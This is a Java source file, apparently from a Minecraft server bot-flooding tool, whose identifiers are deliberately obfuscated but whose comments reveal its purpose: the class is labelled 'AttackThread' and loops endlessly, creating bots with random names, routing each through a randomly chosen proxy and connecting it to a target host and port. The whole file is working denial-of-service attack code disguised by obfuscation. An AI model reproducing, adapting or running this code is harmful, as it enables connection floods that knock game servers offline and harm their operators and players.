package xyz.zihaoxu;

import com.github.steveice10.packetlib.ProxyInfo;
import xyz.zihaoxu.iillIlllI.IllIlIIlllIllI;
import xyz.zihaoxu.IlllIlII.IIIIllllIllIl;

import java.lang.reflect.InvocationTargetException;
import java.net.InetSocketAddress;
import java.util.Random;

public class IIIIlllIl implements Runnable{ // AttackThread
    @Override
    public void run() {
        while (true){
            try {
                String emmm= llllllllllII.aaaaaa(llllllllllII.anString);
                // String name = Configure.generateRandomName(Configure.name_prefix);
                System.out.println(emmm+" Creating");
                ProxyInfo llIlllIl=null;
                if(llllllllllII.aaawww!=null){ // 这里是随机抽取一位幸运代理
                    String lllIIIll=llllllllllII.aaawww.get(new Random().nextInt(llllllllllII.aaawww.size()));
                    llIlllIl=new ProxyInfo(
                            llllllllllII.IIlllIL,
                            new InetSocketAddress(
                                    lllIIIll.split(":")[0],
                                    Integer.parseInt(lllIIIll.split(":")[1])
                            )
                    );
                }
                IIIIllllIllIl HelloWorld=new IIIIllllIllIl( // Bot bot=new Bot(
                        llllllllllII.lllIlIll, // Configure.host,
                        llllllllllII.IllIlIl, // Configure.port,
                        emmm, // name,
                        llIlllIl // proxy_info
                );
                if (!llllllllllII.aaawwawwa){
                    HelloWorld.println(new IllIlIIlllIllI(HelloWorld.getScript())); // bot.addListener(new Listener());
                }
                HelloWorld.exit(); // bot.connect();
                HelloWorld=null;
                // System.gc(); // 看到这里的应该知道为什么我说烧cpu了
                // Thread.sleep(1000);
            } catch (ClassNotFoundException | InstantiationException | IllegalAccessException | NoSuchMethodException |
                     InvocationTargetException | InterruptedException e) {
                throw new RuntimeException(e); // 我觉得这个东西属于多余
            }
        }
    }
}